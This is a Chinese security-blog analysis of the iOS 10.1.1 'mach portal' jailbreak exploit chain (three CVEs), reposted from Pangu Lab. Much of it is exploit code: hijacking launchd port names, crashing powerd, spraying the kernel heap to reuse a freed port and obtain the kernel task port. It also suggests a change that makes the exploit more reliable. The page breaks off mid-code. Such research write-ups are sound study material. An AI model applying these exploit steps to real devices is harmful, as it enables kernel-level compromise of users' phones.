<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>mach portal漏洞利用的一些细节</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">mach portal漏洞利用的一些细节</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-01-09" class="timeago">8 月，1 周 之前</time>
          <time datetime="2017-01-09" class="fulldate">一月 09, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/mobile-security/">移动安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>来源：<strong><a href="http://blog.pangu.io/mach-portal-details/">盘古实验室</a></strong></p>
<p>作者： <strong><a href="http://blog.pangu.io/author/windknown/">windknown@PanguTeam</a></strong></p>
<p>前不久GP0的研究员Ian Beer公布了针对iOS 10.1.1的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=965#c2">漏洞细节及利用代码</a>，通过结合三个漏洞获取设备的root shell。之后意大利研究员<a href="https://twitter.com/qwertyoruiopz/">@qwertyoruiopz</a>在此基础上加入绕过KPP保护的漏洞利用并发布了完整的<a href="http://yalu.qwertyoruiop.com/">iOS10越狱</a>。</p>
<p>Ian Beer已经对漏洞的成因和利用做了相关描述，这里将不再阐述，而是介绍一些利用的细节以及可能的改进建议。</p>
<p>整个exploit chain包含了三个漏洞：</p>
<ul>
<li>CVE-2016-7637 用于替换了launchd进程中往com.apple.iohideventsystem发消息的port</li>
<li>CVE-2016-7661 造成powerd崩溃重启，从而在接管com.apple.iohideventsystem后获取powerd的task port，进而获取host_priv</li>
<li>CVE-2016-7644 导致内核port的UAF，进一步获取kernel_task</li>
</ul>
<h3><strong>替换launchd中的port</strong></h3>
<p>内核中的ipc_object对象对应到用户态下是一个name（int类型），每个进程的 ipc_space_t中保存了name与object之间的映射关系。相关代码可以在 ipc__entry.c中查看，ipc_entry_lookup函数将返回name对应的ipc_entry_t结构，其中保存了对应的object。name的高24位是table中的索引，而低8位是generation number（初始值是-1，增加步长是4，因此一共有64个值）</p>
<div class="codehilite"><pre><span></span><span class="cp">#define    MACH_PORT_INDEX(name)       ((name) &gt;&gt; 8)</span>
<span class="cp">#define    MACH_PORT_GEN(name)     (((name) &amp; 0xff) &lt;&lt; 24)</span>
<span class="cp">#define    MACH_PORT_MAKE(index, gen)  \</span>
<span class="cp">        (((index) &lt;&lt; 8) | (gen) &gt;&gt; 24)</span>
</pre></div>


<p>被释放的name会被标记到freelist的起始位置，当再创建的时候会有相同的索引号，但是generation number会增加4，因此当被重复释放和分配64次后会返回给用户态完全相同的name，从而可以完成劫持。</p>
<div class="codehilite"><pre><span></span><span class="cp">#define    IE_BITS_GEN_MASK    0xff000000  </span><span class="cm">/* 8 bits for generation */</span><span class="cp"></span>
<span class="cp">#define    IE_BITS_GEN(bits)   ((bits) &amp; IE_BITS_GEN_MASK)</span>
<span class="cp">#define    IE_BITS_GEN_ONE     0x04000000  </span><span class="cm">/* low bit of generation */</span><span class="cp"></span>
<span class="cp">#define IE_BITS_NEW_GEN(old)   (((old) + IE_BITS_GEN_ONE) &amp; IE_BITS_GEN_MASK)</span>
</pre></div>


<p>简单的测试代码</p>
<div class="codehilite"><pre><span></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">65</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">mach_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">mach_port_allocate</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">MACH_PORT_RIGHT_RECEIVE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">port</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;port index:0x%x gen:0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">port</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">),</span> <span class="p">(</span><span class="n">port</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">));</span>
        <span class="n">mach_port_destroy</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">port</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div>


<p>在实际利用漏洞的时候，需要在launchd的进程空间内重用name，因此可以发送一个launchd接受的id的消息，就能完成一次分配和释放（send_looper函数）。为了避免name释放后被抢占，首先调用了一次send_looper将要占用的name移动到freelist的末端相对安全的位置，进而再次调用62次来递增generation number，最后一次通过注册服务抢占name，完成了中间人劫持。</p>
<div class="codehilite"><pre><span></span>    // send one smaller looper message to push the free&#39;d name down the free list:
    send_looper(bootstrap_port, ports, 0x100, MACH_MSG_TYPE_MAKE_SEND);

    // send the larger ones to loop the generation number whilst leaving the name in the middle of the long freelist
    for (int i = 0; i &lt; 62; i++) {
        send_looper(bootstrap_port, ports, 0x200, MACH_MSG_TYPE_MAKE_SEND);
    }

    // now that the name should have looped round (and still be near the middle of the freelist
    // try to replace it by registering a lot of new services
    for (int i = 0; i &lt; n_ports; i++) {
        kern_return_t err = bootstrap_register(bootstrap_port, names[i], ports[i]);
        if (err != KERN_SUCCESS) {
            printf(&quot;failed to register service %d, continuing anyway...\n&quot;, i);
        }
    }
</pre></div>


<h3><strong>使powerd崩溃</strong></h3>
<p>powerd在接收到MACH_NOTIFY_DEAD_NAME消息后没有检查发送者及port，就直接调用mach_port_deallocate去释放。利用代码中将被释放的port设置为0x103，该port应该是本进程的task port，一旦被释放后任何的内存分配处理都会直接出错。代码如下</p>
<div class="codehilite"><pre><span></span>    <span class="n">mach_port_t</span> <span class="n">service_port</span> <span class="o">=</span> <span class="n">lookup</span><span class="p">(</span><span class="s">&quot;com.apple.PowerManagement.control&quot;</span><span class="p">);</span>

    <span class="c1">// free task_self in powerd</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">spoof</span><span class="p">(</span><span class="n">service_port</span><span class="p">,</span> <span class="mh">0x103</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// call _io_ps_copy_powersources_info which has an unchecked vm_allocate which will fail</span>
    <span class="c1">// and deref an invalid pointer</span>

    <span class="n">vm_address_t</span> <span class="n">buffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">vm_size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">return_code</span><span class="p">;</span>

    <span class="n">io_ps_copy_powersources_info</span><span class="p">(</span><span class="n">service_port</span><span class="p">,</span>
                                 <span class="mi">0</span><span class="p">,</span>
                                 <span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span>
                                 <span class="p">(</span><span class="n">mach_msg_type_number_t</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">,</span>
                                 <span class="o">&amp;</span><span class="n">return_code</span><span class="p">);</span>
</pre></div>


<p>在测试过程中发现有的设备的mach_task_self()返回的并不是0x103，因此可以增加循环处理的代码来加强利用的适应性。</p>
<div class="codehilite"><pre><span></span>    <span class="c1">// free task_self in powerd</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="mh">0x103</span><span class="p">;</span> <span class="n">port</span> <span class="o">&lt;</span> <span class="mh">0x1003</span><span class="p">;</span> <span class="n">port</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">spoof</span><span class="p">(</span><span class="n">service_port</span><span class="p">,</span> <span class="n">port</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></div>


<h3><strong>内核堆跨Zone攻击</strong></h3>
<p>CVE-2016-7644可以通过race造成内核port对象的UAF，因此第一步需要在port对象被释放后重新去填充。由于所有的port都被分配在特殊的”ipc ports”的zone里，无法使用常见的分配kalloc zone的方式来直接填充内存。因此利用代码首先分配大量port然后释放，再调用mach_zone_force_gc将这些页面释放掉，此后可以在通过kalloc zone里spray内存来占用。</p>
<p>port对象的大小是0xA8（64位），其中ip_context成员（0x90偏移）可以通过用户态API读写的，Ian Beer选择了一种比较巧妙的方式来填充port对象。</p>
<p>首先需要了解mach msg中对MACH_MSG_OOL_PORTS_DESCRIPTOR的处理，内核收到复杂消息后发现是port descriptor后会交给ipc_kmsg_copyin_ool_ports_descriptor函数读入所有的port对象。该函数会调用kalloc分配需要的内存（64位下分配的内存是输入的2倍，name长度是4字节），然后将有效的port由name转换成真实对象地址保存，对于输入是0的name任然会填充0。</p>
<div class="codehilite"><pre><span></span>    <span class="cm">/* calculate length of data in bytes, rounding up */</span>
    <span class="n">ports_length</span> <span class="o">=</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_t</span><span class="p">);</span>
    <span class="n">names_length</span> <span class="o">=</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_name_t</span><span class="p">);</span>

    <span class="p">...</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">kalloc</span><span class="p">(</span><span class="n">ports_length</span><span class="p">);</span>

    <span class="p">...</span>

<span class="cp">#ifdef __LP64__</span>
    <span class="n">mach_port_name_t</span> <span class="o">*</span><span class="n">names</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">((</span><span class="n">mach_port_name_t</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">)[</span><span class="n">count</span><span class="p">];</span>
<span class="cp">#else</span>
    <span class="n">mach_port_name_t</span> <span class="o">*</span><span class="n">names</span> <span class="o">=</span> <span class="p">((</span><span class="n">mach_port_name_t</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">);</span>
<span class="cp">#endif</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">copyinmap</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">names</span><span class="p">,</span> <span class="n">names_length</span><span class="p">)</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
    <span class="p">}</span>

    <span class="n">objects</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_object_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
    <span class="n">dsc</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">mach_port_name_t</span> <span class="n">name</span> <span class="o">=</span> <span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">ipc_object_t</span> <span class="n">object</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">name</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">objects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_object_t</span><span class="p">)</span><span class="n">CAST_MACH_NAME_TO_PORT</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">ipc_object_copyin</span><span class="p">(</span><span class="n">space</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">user_disp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">object</span><span class="p">);</span>

        <span class="p">...</span>

        <span class="n">objects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">object</span><span class="p">;</span>
    <span class="p">}</span>
</pre></div>


<p>如果我们将输入ool port数据的恰当位置的name设置为之前获取的host_priv，那么在内核处理后，host_priv对应的内核object地址会被保存在UAF的port的ip_context成员位置，从而在用户态就可以读取到HOST_PRIV_PORT这个port的真实地址。用于填充内存的代码在send_ool_ports函数，每个descriptor会分配一个kalloc.4096(0x200*8)，一个消息会在内核分配1000个4KB的页面。</p>
<div class="codehilite"><pre><span></span>    <span class="kt">size_t</span> <span class="n">n_ports</span> <span class="o">=</span> <span class="mh">0x200</span><span class="p">;</span>
    <span class="n">mach_port_t</span><span class="o">*</span> <span class="n">ports</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_t</span><span class="p">),</span> <span class="n">n_ports</span><span class="p">);</span>
    <span class="kt">uint32_t</span> <span class="n">obj_offset</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_ports_in_zone</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">uint32_t</span> <span class="n">index</span> <span class="o">=</span> <span class="p">(</span><span class="n">obj_offset</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
        <span class="n">ports</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_send</span><span class="p">;</span>
        <span class="n">obj_offset</span> <span class="o">+=</span> <span class="mh">0xa8</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// build a message with those ool ports:</span>
    <span class="k">struct</span> <span class="n">ool_multi_msg</span><span class="o">*</span> <span class="n">leak_msg</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ool_multi_msg</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">leak_msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ool_msg</span><span class="p">));</span>

    <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">hdr</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">=</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span> <span class="o">|</span> <span class="n">MACH_MSGH_BITS</span><span class="p">(</span><span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">hdr</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ool_msg</span><span class="p">);</span>
    <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">hdr</span><span class="p">.</span><span class="n">msgh_remote_port</span> <span class="o">=</span> <span class="n">q</span><span class="p">;</span>
    <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">hdr</span><span class="p">.</span><span class="n">msgh_local_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">hdr</span><span class="p">.</span><span class="n">msgh_id</span> <span class="o">=</span> <span class="mh">0x41414141</span><span class="p">;</span>

    <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">address</span> <span class="o">=</span> <span class="n">ports</span><span class="p">;</span>
        <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">count</span> <span class="o">=</span> <span class="n">n_ports</span><span class="p">;</span>
        <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">deallocate</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">disposition</span> <span class="o">=</span> <span class="n">MACH_MSG_TYPE_COPY_SEND</span><span class="p">;</span>
        <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">type</span> <span class="o">=</span> <span class="n">MACH_MSG_OOL_PORTS_DESCRIPTOR</span><span class="p">;</span>
        <span class="n">leak_msg</span><span class="o">-&gt;</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">copy</span> <span class="o">=</span> <span class="n">MACH_MSG_PHYSICAL_COPY</span><span class="p">;</span>
    <span class="p">}</span>
</pre></div>


<p>成功填充被释放的port后，即可以读取context的值。</p>
<div class="codehilite"><pre><span></span>    <span class="c1">// get the target page reused by the ool port pointers</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_ool_port_qs</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ool_port_qs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">send_ool_ports</span><span class="p">(</span><span class="n">host_priv</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">uint64_t</span> <span class="n">context</span> <span class="o">=</span> <span class="mi">123</span><span class="p">;</span>
    <span class="n">mach_port_get_context</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">middle_ports</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;read context value: 0x%llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">context</span><span class="p">);</span>
</pre></div>


<h3><strong>获取kernel task port</strong></h3>
<p>HOST_PRIV_PORT这个port是在系统初始化函数kernel_bootstrap里的调用ipc_init创建的，而kernel task port在之后的task_init中创建，因此很大概率这两个port对象在比较接近的内存位置。</p>
<div class="codehilite"><pre><span></span><span class="kt">void</span>
<span class="nf">kernel_bootstrap</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>

    <span class="n">kernel_bootstrap_log</span><span class="p">(</span><span class="s">&quot;ipc_init&quot;</span><span class="p">);</span>
    <span class="n">ipc_init</span><span class="p">();</span>

    <span class="n">kernel_bootstrap_log</span><span class="p">(</span><span class="s">&quot;PMAP_ACTIVATE_KERNEL&quot;</span><span class="p">);</span>
    <span class="n">PMAP_ACTIVATE_KERNEL</span><span class="p">(</span><span class="n">master_cpu</span><span class="p">);</span>

    <span class="n">kernel_bootstrap_log</span><span class="p">(</span><span class="s">&quot;mapping_free_prime&quot;</span><span class="p">);</span>
    <span class="n">mapping_free_prime</span><span class="p">();</span>                       <span class="cm">/* Load up with temporary mapping blocks */</span>

    <span class="n">kernel_bootstrap_log</span><span class="p">(</span><span class="s">&quot;machine_init&quot;</span><span class="p">);</span>
    <span class="n">machine_init</span><span class="p">();</span>

    <span class="n">kernel_bootstrap_log</span><span class="p">(</span><span class="s">&quot;clock_init&quot;</span><span class="p">);</span>
    <span class="n">clock_init</span><span class="p">();</span>

    <span class="n">ledger_init</span><span class="p">();</span>

    <span class="n">kernel_bootstrap_log</span><span class="p">(</span><span class="s">&quot;task_init&quot;</span><span class="p">);</span>
    <span class="n">task_init</span><span class="p">();</span>

    <span class="p">...</span>
<span class="p">}</span>
</pre></div>


<p>上文提到kernel接收MACH_MSG_OOL_PORTS_DESCRIPTOR时候的copyin处理，同样在把消息还给用户态时有copyout的处理，会将真实的port对象地址转换成name还给用户态。可以将UAF的port的context设置成HOST_PRIV_PORT地址附近的port地址，用户态获取name后通过pid_for_task检查是否成功获取kernel task的port。receive_ool_ports函数接收之前发送填充的消息，并检查返回值找到可能的kernel task port。</p>
<div class="codehilite"><pre><span></span>    <span class="k">struct</span> <span class="n">ool_multi_msg_rcv</span> <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_msg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">.</span><span class="n">hdr</span><span class="p">,</span>
                   <span class="n">MACH_RCV_MSG</span><span class="p">,</span>
                   <span class="mi">0</span><span class="p">,</span>
                   <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ool_multi_msg_rcv</span><span class="p">),</span>
                   <span class="n">q</span><span class="p">,</span>
                   <span class="mi">0</span><span class="p">,</span>
                   <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;failed to receive ool ports msg (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">mach_port_t</span> <span class="n">interesting_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="n">mach_port_t</span> <span class="n">kernel_task_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">mach_msg_ool_ports_descriptor_t</span><span class="o">*</span> <span class="n">ool_desc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">.</span><span class="n">ool_ports</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">mach_port_t</span><span class="o">*</span> <span class="n">ool_ports</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="o">*</span><span class="p">)</span><span class="n">ool_desc</span><span class="o">-&gt;</span><span class="n">address</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">ool_desc</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">mach_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="n">ool_ports</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">port</span> <span class="o">==</span> <span class="n">expected</span><span class="p">)</span> <span class="p">{</span>
                <span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">port</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">interesting_port</span> <span class="o">=</span> <span class="n">port</span><span class="p">;</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;found an interesting port 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">kernel_task_port</span> <span class="o">==</span> <span class="n">MACH_PORT_NULL</span> <span class="o">&amp;&amp;</span>
                    <span class="n">is_port_kernel_task_port</span><span class="p">(</span><span class="n">interesting_port</span><span class="p">,</span> <span class="n">valid_kernel_pointer</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">kernel_task_port</span> <span class="o">=</span> <span class="n">interesting_port</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
